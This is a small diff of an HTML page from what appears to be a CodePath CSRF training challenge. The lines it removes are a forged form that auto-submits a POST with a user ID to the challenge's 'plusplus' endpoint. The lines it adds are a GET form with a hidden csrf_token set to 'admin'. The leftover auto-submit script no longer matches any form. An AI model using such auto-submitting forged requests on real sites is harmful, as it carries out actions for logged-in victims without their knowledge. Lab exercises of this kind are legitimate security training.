@@ -8,14 +8,21 @@
 </head>
 <body>
     
-    <form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
-        userId=7044aa2830de6d6ebf5f40b3971881649c791d54
-
-        <input type="submit"/>
-       </form>
+    <form method="GET">
+  	New Username:<br><br>
+  	<input type="text" name="firstname"><br><br>
+  	New Password:<br><br>
+  	<input type="text" name="lastname">
+  	<input type="hidden" name="csrf_token" value="admin">
+  	<br><br>
+  	<input type="submit" value="Update">
+  </form>
        <script>
         document.csrfForm.submit();
        </script>
+
+    
+    
 
 
 
